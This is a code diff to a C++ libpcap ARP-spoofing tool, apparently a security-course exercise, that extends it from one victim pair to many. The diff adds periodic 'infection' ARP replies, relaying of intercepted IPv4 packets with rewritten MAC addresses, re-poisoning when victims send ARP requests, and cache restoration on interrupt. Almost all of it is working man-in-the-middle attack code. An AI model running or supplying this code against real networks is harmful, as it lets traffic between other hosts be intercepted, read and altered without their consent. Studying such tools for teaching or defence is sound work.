@@ -154,19 +154,21 @@ bool SendArpInfectPkt(pcap_t* handle, Ip sender_ip, Mac sender_mac, Ip target_ip
 }
 
 
-void PeriodicInfection(pcap_t* handle, Ip sender_ip, Mac sender_mac, Ip target_ip){
+void PeriodicInfection(pcap_t* handle, std::map<Ip, Ip> Send2Tar, std::map<Ip, Mac> ArpTable){
     while (true)
     {
         std::this_thread::sleep_for(std::chrono::seconds(20));
-        SendArpInfectPkt(handle, sender_ip, sender_mac, target_ip, ARP_REP_TYPE);
+
+        for (auto& ip2ip : Send2Tar)
+            SendArpInfectPkt(handle, ip2ip.first, ArpTable[ip2ip.first], ip2ip.second, ARP_REP_TYPE);
     } 
 }
 
-bool IpPacketRelay(pcap_t* handle, Ip sender_ip, Mac sender_mac, Ip target_ip, Mac target_mac){
+bool IpPacketRelay(pcap_t* handle, std::map<Ip, Ip> Send2Tar, std::map<Ip, Mac> ArpTable){
     
     static std::queue<std::pair<Ip, Ip>> Arp_queue;
 
-    std::thread t1([](pcap_t* handle, Ip sender_ip, Mac sender_mac, Ip target_ip, Mac target_mac){
+    std::thread t1([](pcap_t* handle, std::map<Ip, Ip> Send2Tar, std::map<Ip, Mac> ArpTable){
         while (true)
         {
             pcap_pkthdr* header;
@@ -185,18 +187,20 @@ bool IpPacketRelay(pcap_t* handle, Ip sender_ip, Mac sender_mac, Ip target_ip, M
             // 2. to gateway
             EthIpPacket* _recv_packet = (EthIpPacket*) recv_packet;
             if (_recv_packet->eth_.type() == EthHdr::Ip4 && _recv_packet->eth_.dmac() != Mac("FF:FF:FF:FF:FF:FF")){
-                if (_recv_packet->ip_.sip == htonl(sender_ip) && _recv_packet->ip_.dip !=  htonl(myIp) ){
-                    
-                    _recv_packet->eth_.smac_ = myMac;
-                    _recv_packet->eth_.dmac_ = target_mac;
+                for(auto& ip2ip : Send2Tar)
+                {
+                    if (_recv_packet->eth_.smac() == ArpTable[ip2ip.first] && _recv_packet->ip_.dip !=  htonl(myIp) ){
+                        
+                        _recv_packet->eth_.smac_ = myMac;
+                        _recv_packet->eth_.dmac_ = ArpTable[ip2ip.second];
 
-                    int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(_recv_packet), header->caplen);
-                    if (res != 0) {
-                        fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
+                        int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(_recv_packet), header->caplen);
+                        if (res != 0) {
+                            fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
+                        }
+                        break;
                     }
-                    continue;
-                    
-                }
+                }                
             }
 
             // if receive packet is
@@ -205,16 +209,18 @@ bool IpPacketRelay(pcap_t* handle, Ip sender_ip, Mac sender_mac, Ip target_ip, M
             // 2. to target_ip
             EthArpPacket* __recv_packet = (EthArpPacket*) recv_packet;
             if (__recv_packet->eth_.type() == EthHdr::Arp){
-                if(__recv_packet->arp_.sip() == sender_ip && __recv_packet->arp_.tip() == target_ip){
-                    std::pair<Ip, Ip> p_arp(sender_ip, target_ip);
-                    Arp_queue.push( p_arp );
-                    Arp_queue.pop();
-                    SendArpInfectPkt(handle, sender_ip, sender_mac, target_ip, ARP_REP_TYPE);
-                }
+                for(auto& ip2ip : Send2Tar)
+                {
+                    if(__recv_packet->arp_.sip() == ip2ip.first && __recv_packet->arp_.tip() == ip2ip.second){
+                        Arp_queue.push( ip2ip );
+                        Arp_queue.pop();
+                        SendArpInfectPkt(handle, ip2ip.first, ArpTable[ip2ip.first], ip2ip.second, ARP_REP_TYPE);
+                    }
+                }          
             }   
         }
 
-    }, handle, sender_ip, sender_mac, target_ip, target_mac);
+    }, handle, Send2Tar, ArpTable);
     /*
     std::thread t2([](){
         while (true)
@@ -237,17 +243,20 @@ void SigINTHandler(int sig){
     EthArpPacket arp_pkt;
     printf("\n");
     
-    // arp infection packet type ** Reply **
-    // ethernet : my_mac -> sender_mac
-    // arp : (target_mac, target_ip) -> (sender_mac, sender_ip) : target_ip is target_mac!
-    MakeEthArpPkt(&arp_pkt, myMac, sender_mac, target_mac, target_ip, sender_mac, sender_ip, ARP_REP_TYPE);
+    for (auto& ip2ip : Send2Tar)
+    {
+        // arp infection packet type ** Reply **
+        // ethernet : my_mac -> sender_mac
+        // arp : (target_mac, target_ip) -> (sender_mac, sender_ip) : target_ip is target_mac!
+        MakeEthArpPkt(&arp_pkt, myMac, ArpTable[ip2ip.first], ArpTable[ip2ip.second], ip2ip.second, ArpTable[ip2ip.first], ip2ip.first, ARP_REP_TYPE);
 
-    // send arp packet
-    int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&arp_pkt), sizeof(EthArpPacket));
-    if (res != 0) {
-        fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
+        // send arp packet
+        int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&arp_pkt), sizeof(EthArpPacket));
+        if (res != 0) {
+            fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
+        }
     }
 
     printf("\nARP-spoofing DONE!\n");
-    exit(1);
+    exit(0);
 }
